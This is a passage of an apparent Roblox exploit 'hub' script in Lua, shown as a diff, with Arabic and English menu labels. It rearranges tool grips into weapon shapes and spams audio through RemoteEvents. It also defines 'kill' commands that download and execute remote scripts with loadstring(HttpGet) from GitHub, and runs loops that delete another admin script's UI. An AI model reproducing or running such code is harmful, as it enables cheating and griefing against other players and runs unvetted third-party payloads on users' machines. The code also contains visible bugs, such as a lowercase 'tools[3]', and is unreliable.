+    plr.Backpack:FindFirstChild("رقصة 7").Name = "قص"
+    plr.Backpack:FindFirstChild("رقصة 8").Name = "قص"
+    plr.Backpack:FindFirstChild("رقصة 9").Name = "قص"
+    plr.Backpack:FindFirstChild("رقصة 01").Name = "قص"
+    plr.Backpack:FindFirstChild("رقصة 11").Name = "قص"
+    plr.Backpack:FindFirstChild("رقصة 21").Name = "قص"
+    for i,v in pairs(plr.Backpack:GetDescendants()) do
+        if v.Name ==  "قص" then
+            v:Destroy()
+        end
+    end 
+end
+
+function getRoot(char)
+    local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
+    return rootPart
+end
+
+function tools(plr)
+    if plr:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass('Tool') or plr.Character:FindFirstChildOfClass('Tool') then
+        return true
+    end
+end
+
+function grabtools()
+    Bd()
+    local Human = plr.Character:FindFirstChildWhichIsA("Humanoid")
+    for _, v in ipairs(workspace:GetChildren()) do
+        if plr.Character and v:IsA("BackpackItem") and v:FindFirstChild("Handle") then
+            Human:EquipTool(v)
+        end
+    end
+    if grabtoolsFunc then grabtoolsFunc:Disconnect() end
+    grabtoolsFunc = workspace.ChildAdded:Connect(function(v)
+        if plr.Character and v:IsA("BackpackItem") and v:FindFirstChild("Handle") then
+            plr.Character.Humanoid:EquipTools()
+        end
+    end)
+end
+function ungrabtools()
+    if grabtoolsFunc then grabtoolsFunc:Disconnect() end
+end
+spawn(function ()
+    function dropped()
+    if plr.Character then
+        for _,obj in pairs(plr.Character:GetChildren()) do
+            if obj:IsA("Tool") then
+                obj.CanBeDropped = true
+            end
+        end
+    end
+    if plr:FindFirstChildOfClass("Backpack") then
+        for _,obj in pairs(plr:FindFirstChildOfClass("Backpack"):GetChildren()) do
+            if obj:IsA("Tool") then
+                obj.CanBeDropped = true
+            end
+        end
+    end
+end
+end)
+
+
+
+spawn(function ()
+    function AK()
+        GUI:Notify({
+            Title = "Note",
+            Content = "you must have 20 tools or it will not work",
+            Duration = 6.5,
+        })
+        local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
+        local Tools = plr.Backpack:GetChildren(radio)
+        Tools[1].Grip = CFrame.new(0.7, -0.5, -0.2) * CFrame.Angles(50, math.rad(-180), 3.13)
+        Tools[1].Parent = plr.Character
+
+        Tools[2].Grip = CFrame.new(0.5, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0)
+        Tools[2].Parent = plr.Character
+
+        Tools[3].Grip = CFrame.new(-1.5, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0.03)
+        Tools[3].Parent = plr.Character
+
+        Tools[4].Grip = CFrame.new(-2.5, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0)
+        Tools[4].Parent = plr.Character
+
+        Tools[5].Grip = CFrame.new(-4.6, -0.4, -0.2) * CFrame.Angles(1.6, math.rad(-98), 1.6)
+        Tools[5].Parent = plr.Character
+
+        Tools[6].Grip = CFrame.new(-7, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0)
+        Tools[6].Parent = plr.Character
+
+        Tools[7].Grip = CFrame.new(-9.6, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0)
+        Tools[7].Parent = plr.Character
+
+        Tools[8].Grip = CFrame.new(-12.2, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0)
+        Tools[8].Parent = plr.Character
+
+        Tools[9].Grip = CFrame.new(-1.2, -3.1, -0.2) * CFrame.Angles(1.6, math.rad(-15), 1.6)
+        Tools[9].Parent = plr.Character
+
+        Tools[10].Grip = CFrame.new(-3.3, -2.7, -0.2) * CFrame.Angles(1.6, math.rad(-25), 1.6)
+        Tools[10].Parent = plr.Character
+
+        Tools[11].Grip = CFrame.new(-0.1, 1.8, -0.1) * CFrame.Angles(1.6, math.rad(65), 1.6)
+        Tools[11].Parent = plr.Character
+
+        Tools[12].Grip = CFrame.new(1.3, 2.05, -0.1) * CFrame.Angles(1.6, math.rad(90), 1.6)
+        Tools[12].Parent = plr.Character
+
+        Tools[13].Grip = CFrame.new(3.15, 2.05, -0.1) * CFrame.Angles(1.6, math.rad(90), 1.6)
+        Tools[13].Parent = plr.Character
+
+        Tools[14].Grip = CFrame.new(5.3, 2.05, -0.1) * CFrame.Angles(1.6, math.rad(90), 1.6)
+        Tools[14].Parent = plr.Character
+
+        Tools[15].Grip = CFrame.new(6.5, 4.1, -0.1) * CFrame.Angles(1.6, math.rad(110), 1.6)
+        Tools[15].Parent = plr.Character
+
+        Tools[16].Grip = CFrame.new(-14.3, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0)
+        Tools[16].Parent = plr.Character
+
+        Tools[17].Grip = CFrame.new(3.1, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0)
+        Tools[17].Parent = plr.Character
+
+        Tools[18].Grip = CFrame.new(5.2, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0)
+        Tools[18].Parent = plr.Character
+
+        Tools[19].Grip = CFrame.new(0.25, 6.8, -0.05) * CFrame.Angles(1.6, math.rad(-0), 1.6)
+        Tools[19].Parent = plr.Character
+
+        Tools[20].Grip = CFrame.new(3.8, -4.4, -0.27) * CFrame.Angles(1.6, math.rad(-137), 1.6)
+        Tools[20].Parent = plr.Character
+    end
+    end)
+
+spawn(function ()
+    function PICKAXE()
+        GUI:Notify({
+            Title = "Note",
+            Content = "you must have 8 tools or it will not work",
+            Duration = 6.5,
+        })
+        local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
+        local Tools = plr.Backpack:GetChildren(radio)
+
+        Tools[1].Grip = CFrame.new(-0.4, 0.6, 0) * CFrame.Angles(1.6, math.rad(-180), 1.58)
+        Tools[1].Parent = plr.Character
+
+        Tools[2].Grip = CFrame.new(-2.7, 0.6, 0) * CFrame.Angles(1.6, math.rad(-180), 1.58)
+        Tools[2].Parent = plr.Character
+
+        Tools[3].Grip = CFrame.new(-4.5, 0.6, 0) * CFrame.Angles(1.6, math.rad(-180), 1.58)
+        Tools[3].Parent = plr.Character
+
+        Tools[4].Grip = CFrame.new(-6.3, 0.6, 0) * CFrame.Angles(1.6, math.rad(-180), 1.58)
+        Tools[4].Parent = plr.Character
+
+        Tools[5].Grip = CFrame.new(-0.3, 6.85, -0.4) * CFrame.Angles(38.5, math.rad(-270), 2.3)
+        Tools[5].Parent = plr.Character
+
+        Tools[6].Grip = CFrame.new(1.8, 6.85, -0.4) * CFrame.Angles(38.5, math.rad(-270), 2.3)
+        Tools[6].Parent = plr.Character
+
+        Tools[7].Grip = CFrame.new(3.3, 5.4, 0.32) * CFrame.Angles(1.6, math.rad(-320), 1.6)
+        Tools[7].Parent = plr.Character
+
+        Tools[8].Grip = CFrame.new(-2.42, 6.6, 0.32) * CFrame.Angles(1.6, math.rad(-220), 1.6)
+        Tools[8].Parent = plr.Character
+    end
+end)
+
+spawn(function ()
+    function RPG()
+    GUI:Notify({
+            Title = "Note",
+            Content = "you must have 13 tools or it will not work",
+            Duration = 6.5,
+        })
+        local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
+        local Tools = plr.Backpack:GetChildren(radio)
+        
+        Tools[1].Grip = CFrame.new(0.7, -0.5, -0.2) * CFrame.Angles(50, math.rad(-180), 3.13)
+        Tools[1].Parent = plr.Character
+
+        Tools[2].Grip = CFrame.new(0.7, -1.2, -0.2) * CFrame.Angles(1.6, math.rad(-98),1.6)
+        Tools[2].Parent = plr.Character
+
+        Tools[3].Grip = CFrame.new(2.5, -1.2, -0.2) * CFrame.Angles(1.6, math.rad(-98),1.6)
+        Tools[3].Parent = plr.Character
+        
+        Tools[4].Grip = CFrame.new(4.3, -1.2, -0.2) * CFrame.Angles(1.6, math.rad(-98),1.6)
+        Tools[4].Parent = plr.Character
+
+        Tools[5].Grip = CFrame.new(-6.5, -1.6, -0.2) * CFrame.Angles(1.6, math.rad(-250),1.6)
+        Tools[5].Parent = plr.Character
+
+        Tools[6].Grip = CFrame.new(6, -2.55, -0.2) * CFrame.Angles(1.6, math.rad(-115),1.6)
+        Tools[6].Parent = plr.Character
+        
+        Tools[7].Grip = CFrame.new(1.55, 7.2, 0.1) * CFrame.Angles(1.6, math.rad(-10),1.6)
+        Tools[7].Parent = plr.Character
+        
+        Tools[8].Grip = CFrame.new(-1.1, -1.2, -0.23) * CFrame.Angles(1.6, math.rad(-98),1.57)
+        Tools[8].Parent = plr.Character
+
+        Tools[9].Grip = CFrame.new(-2.8, -1.17, -0.17) * CFrame.Angles(1.6, math.rad(-99),1.6)
+        Tools[9].Parent = plr.Character
+        
+        Tools[10].Grip = CFrame.new(0, 2.7, -0.2) * CFrame.Angles(1.575, math.rad(-175),1.575)
+        Tools[10].Parent = plr.Character
+        
+        Tools[11].Grip = CFrame.new(-4.6, -1.1, -0.17) * CFrame.Angles(1.6, math.rad(-100),1.6)
+        Tools[11].Parent = plr.Character
+        
+        Tools[12].Grip = CFrame.new(-6.3, -1.1, -0.17) * CFrame.Angles(1.6, math.rad(-100),1.6)
+        Tools[12].Parent = plr.Character
+
+        Tools[13].Grip = CFrame.new(-1, 6, -0.45) * CFrame.Angles(1.6, math.rad(-205),1.4)
+        Tools[13].Parent = plr.Character
+    end
+end)
+spawn(function ()
+    function SWORD()
+        GUI:Notify({
+            Title = "Note",
+            Content = "you must have 10 tools or it will not work",
+            Duration = 6.5,
+        })
+        local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
+        local Tools = plr.Backpack:GetChildren(radio)
+
+        Tools[1].Grip = CFrame.new(0, -0.3, 0) * CFrame.Angles(1.58, math.rad(-360), 1.58)
+        Tools[1].Parent = plr.Character
+
+        Tools[2].Grip = CFrame.new(0.15, 1.7, -0.02) * CFrame.Angles(1.58, math.rad(90), 1.58)
+        Tools[2].Parent = plr.Character
+
+        Tools[3].Grip = CFrame.new(3, -0.9, -0.05) * CFrame.Angles(1.58, math.rad(-45), 1.58)
+        Tools[3].Parent = plr.Character
+
+        Tools[4].Grip = CFrame.new(-3.1, -0.67, -0.049) * CFrame.Angles(1.58, math.rad(-135), 1.58)
+        Tools[4].Parent = plr.Character
+
+        Tools[5].Grip = CFrame.new(2.2, -0.3, -0.03) * CFrame.Angles(1.58, math.rad(-360), 1.58)
+        Tools[5].Parent = plr.Character
+
+        Tools[6].Grip = CFrame.new(4.2, -0.3, 0) * CFrame.Angles(1.58, math.rad(-360), 1.58)
+        Tools[6].Parent = plr.Character
+
+        Tools[7].Grip = CFrame.new(6.2, -0.3, 0) * CFrame.Angles(1.58, math.rad(-360), 1.58)
+        Tools[7].Parent = plr.Character
+
+        Tools[8].Grip = CFrame.new(8.2, -0.3, 0) * CFrame.Angles(1.58, math.rad(-360), 1.58)
+
+        Tools[8].Parent = plr.Character
+
+        Tools[9].Grip = CFrame.new(10.2, -0.3, 0) * CFrame.Angles(1.58, math.rad(-360), 1.58)
+        Tools[9].Parent = plr.Character
+
+        Tools[10].Grip = CFrame.new(12.2, -0.3, 0) * CFrame.Angles(1.58, math.rad(-360), 1.58)
+        Tools[10].Parent = plr.Character
+    end
+end)
+
+spawn(function ()
+    function RAILGUNV1()
+        GUI:Notify({
+            Title = "Note",
+            Content = "you must have 12 tools or it will not work",
+            Duration = 6.5,
+        })
+        local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
+        local Tools = plr.Backpack:GetChildren(radio)
+
+        Tools[1].Grip = CFrame.new(1.1, -1.2, 0) * CFrame.Angles(-1.58, math.rad(-108), -1.58)
+        Tools[1].Parent = plr.Character
+
+        Tools[2].Grip = CFrame.new(2.7, -1.2, 0.02) * CFrame.Angles(-1.58, math.rad(-108), -1.58)
+        Tools[2].Parent = plr.Character
+
+        tools[3].Grip = CFrame.new(4.5, -2.34, 0) * CFrame.Angles(-1.58, math.rad(-90), -1.58)
+        Tools[3].Parent = plr.Character
+
+        Tools[4].Grip = CFrame.new(4, 5.1, -0.07) * CFrame.Angles(-1.58, math.rad(-180), -1.58)
+        Tools[4].Parent = plr.Character
+
+        Tools[5].Grip = CFrame.new(-5.6, 0.9, -0.07) * CFrame.Angles(-1.58, math.rad(-305), -1.58)
+        Tools[5].Parent = plr.Character
+
+        Tools[6].Grip = CFrame.new(-1.29, 3.5, -0.07) * CFrame.Angles(-1.58, math.rad(-262), -1.58)
+        Tools[6].Parent = plr.Character
+
+        Tools[7].Grip = CFrame.new(4, 1, -0.07) * CFrame.Angles(-1.58, math.rad(-193), -1.58)
+        Tools[7].Parent = plr.Character
+
+        Tools[8].Grip = CFrame.new(-2.8, -0.8, 0) * CFrame.Angles(-1.58, math.rad(-25), -1.58)
+        Tools[8].Parent = plr.Character
+        
+        Tools[9].Grip = CFrame.new(0.8, 4.8, -0.07) * CFrame.Angles(-1.58, math.rad(-270), -1.58)
+        Tools[9].Parent = plr.Character
+
+        Tools[10].Grip = CFrame.new(-2.3, -3.8, 0) * CFrame.Angles(-1.58, math.rad(-90), -1.58)
+        Tools[10].Parent = plr.Character
+
+        Tools[11].Grip = CFrame.new(-3, -3.8, 0) * CFrame.Angles(-1.58, math.rad(-90), -1.58)
+        Tools[11].Parent = plr.Character
+
+        Tools[12].Grip = CFrame.new(3, 4.8, -0.075) * CFrame.Angles(-1.58, math.rad(-270), -1.58)
+        Tools[12].Parent = plr.Character
+    end
+end)
+
+
+spawn(function ()
+    function RAILGUNV2()
+        GUI:Notify({
+            Title = "Note",
+            Content = "you must have 23 tools or it will not work",
+            Duration = 6.5,
+        })
+        local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
+        local Tools = plr.Backpack:GetChildren(radio)
+    
+        Tools[1].Grip = CFrame.new(1.1, -1.2, 0) * CFrame.Angles(-1.58, math.rad(-108), -1.58)
+        Tools[1].Parent = plr.Character
+
+        Tools[2].Grip = CFrame.new(2.7, -1.2, 0.02) * CFrame.Angles(-1.58, math.rad(-108), -1.58)
+        Tools[2].Parent = plr.Character
+
+        Tools[3].Grip = CFrame.new(4.5, -2.34, 0) * CFrame.Angles(-1.58, math.rad(-90), -1.58)
+        Tools[3].Parent = plr.Character
+
+        Tools[4].Grip = CFrame.new(4, 5.1, -0.07) * CFrame.Angles(-1.58, math.rad(-180), -1.58)
+        Tools[4].Parent = plr.Character
+
+        Tools[5].Grip = CFrame.new(-5.6, 0.9, -0.07) * CFrame.Angles(-1.58, math.rad(-305), -1.58)
+        Tools[5].Parent = plr.Character
+
+        Tools[6].Grip = CFrame.new(-1.29, 3.5, -0.07) * CFrame.Angles(-1.58, math.rad(-262), -1.58)
+        Tools[6].Parent = plr.Character
+
+        Tools[7].Grip = CFrame.new(4, 1, -0.07) * CFrame.Angles(-1.58, math.rad(-193), -1.58)
+        Tools[7].Parent = plr.Character
+
+        Tools[8].Grip = CFrame.new(-2.8, -0.8, 0) * CFrame.Angles(-1.58, math.rad(-25), -1.58)
+        Tools[8].Parent = plr.Character
+
+        Tools[9].Grip = CFrame.new(0.8, 4.8, -0.07) * CFrame.Angles(-1.58, math.rad(-270), -1.58)
+        Tools[9].Parent = plr.Character
+
+        Tools[10].Grip = CFrame.new(0.6, -2.8, 0) * CFrame.Angles(-1.58, math.rad(-80), -1.58)
+        Tools[10].Parent = plr.Character
+
+        Tools[11].Grip = CFrame.new(-7.3, -2.3, 0) * CFrame.Angles(-1.58, math.rad(-45), -1.58)
+        Tools[11].Parent = plr.Character
+
+        Tools[12].Grip = CFrame.new(1.2, 3.95, -0.062) * CFrame.Angles(-1.58, math.rad(45), -1.58)
+        Tools[12].Parent = plr.Character
+
+        Tools[13].Grip = CFrame.new(4.3, 5.3, -0.075) * CFrame.Angles(-1.58, math.rad(-270), -1.58)
+        Tools[13].Parent = plr.Character
+        
+        Tools[14].Grip = CFrame.new(-4.3, -3.5, 0) * CFrame.Angles(-1.58, math.rad(-90), -1.58)
+        Tools[14].Parent = plr.Character
+
+        Tools[15].Grip = CFrame.new(6.6, 5.3, -0.075) * CFrame.Angles(-1.58, math.rad(-270), -1.58)
+        Tools[15].Parent = plr.Character
+
+        Tools[16].Grip = CFrame.new(-6.6, -3.5, 0) * CFrame.Angles(-1.58, math.rad(-90), -1.58)
+        Tools[16].Parent = plr.Character
+
+        Tools[17].Grip = CFrame.new(8.8, 5.3, -0.075) * CFrame.Angles(-1.58, math.rad(-270), -1.58)
+        Tools[17].Parent = plr.Character
+
+        Tools[18].Grip = CFrame.new(-8.8, -3.5, 0) * CFrame.Angles(-1.58, math.rad(-90), -1.58)
+        Tools[18].Parent = plr.Character
+
+        Tools[19].Grip = CFrame.new(11, 5.3, -0.075) * CFrame.Angles(-1.58, math.rad(-270), -1.58)
+        Tools[19].Parent = plr.Character
+
+        Tools[20].Grip = CFrame.new(-11, -3.5, 0) * CFrame.Angles(-1.58, math.rad(-90), -1.58)
+        Tools[20].Parent = plr.Character
+
+        Tools[21].Grip = CFrame.new(3.7, 4.2, -0.075) * CFrame.Angles(-1.58, math.rad(-250), -1.58)
+        Tools[21].Parent = plr.Character
+
+        Tools[22].Grip = CFrame.new(-0.8, -4.1, 0) * CFrame.Angles(-1.58, math.rad(250), -1.58)
+        Tools[22].Parent = plr.Character
+
+        Tools[23].Grip = CFrame.new(-0.7, -0.2, -0.2) * CFrame.Angles(1.57, math.rad(-270), 0)
+        Tools[23].Parent = plr.Character
+    end
+end)
+function getPlayersByName(Name)
+	local Name,Len,Found = string.lower(Name),#Name,{}
+	for _,v in pairs(Players:GetPlayers()) do
+		if Name:sub(0,1) == '@' then
+			if string.sub(string.lower(v.Name),1,Len-1) == Name:sub(2) then
+				table.insert(Found,v)
+			end
+		else
+			if string.sub(string.lower(v.Name),1,Len) == Name or string.sub(string.lower(v.DisplayName),1,Len) == Name then
+				table.insert(Found,v)
+			end
+		end
+	end
+	return Found
+end
+
+function getPlayer(list,plr)
+	if list == nil then return {plr.Name} end
+	local nameList = splitString(list,",")
+
+	local foundList = {}
+
+	for _,name in pairs(nameList) do
+		if string.sub(name,1,1) ~= "+" and string.sub(name,1,1) ~= "-" then name = "+"..name end
+		local tokens = toTokens(name)
+		local initialPlayers = Players:GetPlayers()
+
+		for i,v in pairs(tokens) do
+			if v.Operator == "+" then
+				local tokenContent = v.Name
+				local foundCase = false
+				for regex,case in pairs(SpecialPlayerCases) do
+					local matches = {string.match(tokenContent,"^"..regex.."$")}
+					if #matches > 0 then
+						foundCase = true
+						initialPlayers = onlyIncludeInTable(initialPlayers,case(plr,matches,initialPlayers))
+					end
+				end
+				if not foundCase then
+					initialPlayers = onlyIncludeInTable(initialPlayers,getPlayersByName(tokenContent))
+				end
+			else
+				local tokenContent = v.Name
+				local foundCase = false
+				for regex,case in pairs(SpecialPlayerCases) do
+					local matches = {string.match(tokenContent,"^"..regex.."$")}
+					if #matches > 0 then
+						foundCase = true
+						initialPlayers = removeTableMatches(initialPlayers,case(plr,matches,initialPlayers))
+					end
+				end
+				if not foundCase then
+					initialPlayers = removeTableMatches(initialPlayers,getPlayersByName(tokenContent))
+				end
+			end
+		end
+
+		for i,v in pairs(initialPlayers) do table.insert(foundList,v) end
+	end
+
+	local foundNames = {}
+	for i,v in pairs(foundList) do table.insert(foundNames,v.Name) end
+
+	return foundNames
+end
+spawn(function ()
+    function pc()
+        GUI:Notify({
+            Title = "Note",
+            Content = "you must have 11 tools or it will not work",
+            Duration = 6.5,
+        })
+    local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
+    local Tools = plr.Backpack:GetChildren(radio)
+
+    Tools[1].Grip = CFrame.new(0.8, 1.5, 0) * CFrame.Angles(1.575, math.rad(-180), 3.1)
+    Tools[1].Parent = plr.Character
+
+    Tools[2].Grip = CFrame.new(-0.8, -0.6, 0) * CFrame.Angles(1.575, math.rad(0), 3.1)
+    Tools[2].Parent = plr.Character
+
+    Tools[3].Grip = CFrame.new(3, 1.5, 0) * CFrame.Angles(1.575, math.rad(-180), 3.1)
+    Tools[3].Parent = plr.Character
+
+    Tools[4].Grip = CFrame.new(-3, -0.6, 0) * CFrame.Angles(1.575, math.rad(0), 3.1)
+    Tools[4].Parent = plr.Character
+
+    Tools[5].Grip = CFrame.new(5.2, 1.5, 0) * CFrame.Angles(1.575, math.rad(-180), 3.1)
+    Tools[5].Parent = plr.Character
+
+    Tools[6].Grip = CFrame.new(-5.2, -0.6, 0) * CFrame.Angles(1.575, math.rad(0), 3.1)
+    Tools[6].Parent = plr.Character
+
+    Tools[7].Grip = CFrame.new(1.1, 2.5, -2.95) * CFrame.Angles(1.575, math.rad(180), 4.68)
+    Tools[7].Parent = plr.Character
+
+    Tools[8].Grip = CFrame.new(-2.2, -3, -2.17) * CFrame.Angles(3.13, math.rad(0), 3.1)
+    Tools[8].Parent = plr.Character
+
+    Tools[9].Grip = CFrame.new(-4, -3, -2.1699) * CFrame.Angles(3.13, math.rad(0), 3.1)
+    Tools[9].Parent = plr.Character
+
+    Tools[10].Grip = CFrame.new(2.2, 3.9, -2.26) * CFrame.Angles(3.13, math.rad(0), -0.04)
+    Tools[10].Parent = plr.Character
+
+    Tools[11].Grip = CFrame.new(4, 3.9, -2.26) * CFrame.Angles(3.13, math.rad(0), -0.04)
+    Tools[11].Parent = plr.Character
+    end
+end)
+spawn(function ()
+    function BOOMBOXARM()
+        GUI:Notify({
+            Title = "Note",
+            Content = "you must have 4 tools or it will not work",
+            Duration = 6.5,
+        })
+    local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
+    local Tools = plr.Backpack:GetChildren(radio)
+
+    Tools[1].Grip = CFrame.new(0.6, -0.1, -0.4) * CFrame.Angles(1.58, math.rad(-90), 0)
+    Tools[1].Parent = plr.Character
+
+    Tools[2].Grip = CFrame.new(0.6, -0.1, -0.3625) * CFrame.Angles(1.58, math.rad(-90), 1.58)
+    Tools[2].Parent = plr.Character
+
+    Tools[3].Grip = CFrame.new(0.6, -0.1, -0.359) * CFrame.Angles(0, math.rad(-90), 1.58)
+    Tools[3].Parent = plr.Character
+
+    Tools[4].Grip = CFrame.new(0.6, -0.1, -0.4) * CFrame.Angles(0, math.rad(-90), -3.15)
+    Tools[4].Parent = plr.Character
+    end
+end)
+
+spawn(function ()
+    function PHONE()
+        GUI:Notify({
+            Title = "Note",
+            Content = "you must have 6 tools or it will not work",
+            Duration = 6.5,
+        })
+    local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
+    local Tools = plr.Backpack:GetChildren(radio)
+    
+    Tools[1].Grip = CFrame.new(-1, 0.5, 0) * CFrame.Angles(0.2, math.rad(-180), 58.1)
+    Tools[1].Parent = plr.Character
+
+    Tools[2].Grip = CFrame.new(2.5, -0, 0) * CFrame.Angles(-0.2, math.rad(-180), -58.13)
+    Tools[2].Parent = plr.Character
+
+    Tools[3].Grip = CFrame.new(-2.5, 0.5, 0) * CFrame.Angles(0.2, math.rad(-180), 58.1)
+    Tools[3].Parent = plr.Character
+
+    Tools[4].Grip = CFrame.new(1, -0, 0) * CFrame.Angles(-0.2, math.rad(-180), -58.13)
+    Tools[4].Parent = plr.Character
+
+    Tools[5].Grip = CFrame.new(-4, 0.5, 0) * CFrame.Angles(0.2, math.rad(-180), 58.1)
+    Tools[5].Parent = plr.Character
+
+    Tools[6].Grip = CFrame.new(4, -0, 0) * CFrame.Angles(-0.2, math.rad(-180), -58.13)
+    Tools[6].Parent = plr.Character
+    end
+end)
+
+function Equip()
+    Bd()
+    for i, v in pairs(plr.Backpack:GetChildren()) do
+        if v:IsA("Tool") and v.Name == radio then
+            wait(.08)
+            v.Parent = plr.Character
+        end
+    end
+end
+
+function invisb()
+    Bd()
+    Equip()
+    -- [ Locals ] --
+    local Player = game.Players.LocalPlayer
+    local Char = Player.Character
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name == "Union" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "Beam" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "B1" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "B2" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "BB1" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "BB2" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "ParticleEmitter" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "Trail" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "Trail" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "Trail0" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "Trail1" then
+            v:Destroy()
+     end
+    end
+    end
+
+function Mesh()
+
+    Bd()
+    Equip()
+    -- [ Locals ] --
+    local Player = game.Players.LocalPlayer
+    local Char = Player.Character
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name == "Union" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "Beam" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "B1" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "B2" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "BB1" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "BB2" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "ParticleEmitter" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "Trail" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "Trail" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "Trail0" then
+            v:Destroy()
+     end
+    end
+    for i,v in pairs(Char:GetDescendants()) do
+        if v.Name ==  "Trail1" then
+            v:Destroy()
+     end
+    end
+    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";visible me")
+    end
+
+function r15(plr)
+    if plr.Character:FindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R15 then
+        return true
+    end
+end
+local Prefix = "!"
+local oprefix = "+"
+spawn(function ()
+    function killv1()
+        if _G.killv1 == false then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/klat3mk/remake/main/fe%20kill%20for%20any%20game'))()
+    _G.killv1 = true
+else 
+    print("executed")
+end
+end
+end)
+
+
+spawn(function ()
+    function killv2()
+    if game:GetService("CoreGui"):FindFirstChild("IvAdmin CommandBar")  then
+    print("executed")
+else 
+    if _G.killv2 == false then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/BloodyBurns/Hexx/main/Iv%20Admin/Admin%202.lua'))()
+        game:GetService("CoreGui"):WaitForChild("IvAdmin CommandBar").Enabled = false
+        game:GetService("CoreGui"):WaitForChild("IvAdmin Notifications").Enabled = false
+        plr.Character.Head:WaitForChild("Client Bridge v3").Enabled = false
+        _G.killv2 = true
+    end
+end
+end
+end)
+
+spawn(function ()
+    while wait() do
+        for i,v in pairs(plr:GetChildren()) do
+            if v.Name == "Client Bridge v3" then
+                v:Destroy()
+            end
+        end
+        if plr.CharacterAdded:wait() then
+            wait(0.7)
+            plr.Character.Head:WaitForChild("Client Bridge v3"):Destroy()
+        end
+    end
+end)
+
+spawn(function ()
+    while wait() do
+        for i,v in pairs(game:GetChildren()) do
+            if v.Name == "IvAdmin Notifications" then
+                v:Destroy()
+            end
+        end
+        if plr.CharacterAdded:wait() then
+            wait(0.7)
+            plr.Character.Head:WaitForChild("Client Bridge v3"):Destroy()
+        end
+        wait(1)
+    end
+end)
+
+spawn(function ()
+    while wait() do
+        for i,v in pairs(game:GetChildren()) do
+            if v.Name == "IvAdmin CommandBar" then
+                v:Destroy()
+            end
+        end
+        if plr.CharacterAdded:wait() then
+            wait(0.7)
+            plr.Character.Head:WaitForChild("Client Bridge v3"):Destroy()
+        end
+        wait(1)
+    end
+end)
+
+
+
+
+spawn(function ()
+    function massplay(ID)
+    local Player = plr
+    local Char = Player.Character
+    plr.Character.Humanoid:UnequipTools()
+    wait()
+    for i,v in pairs(Player.Backpack:GetDescendants()) do
+    if (v:IsA('Tool')) and v.Name == radio then
+            v.Parent = Player.Character
+            end
+    end
+        for i,v in pairs(Char:GetDescendants()) do
+            if (v:IsA('RemoteEvent')) then
+            v:FireServer('PlaySong', tonumber(ID))
+        end
+    end
+    end
+end)   
+    
+local function GetHandleTools(p)
+    p = p or Players.LocalPlayer
+end
+
+
+local Section = home:CreateSection("Welcome to my Hub " .. plr.Name)
+
+local Input = home:CreateInput({
+     Name = "massplay / دبل راديو",
+    PlaceholderText = "AUDIO ID",
+    RemoveTextAfterFocusLost = true,
+    Callback = function(ID)
+        GUI:Notify({
+             Title = "ID",
+            Content = "Playing "..ID,
+            Duration = 5.2,
+        })
+    massplay(ID)
+    end,
+})
+
+
+local Input = home:CreateInput({
+    Name = "Dupe / نسخ راديو انصحكم ب خمسه",
+   PlaceholderText = "(5 is recommended)",
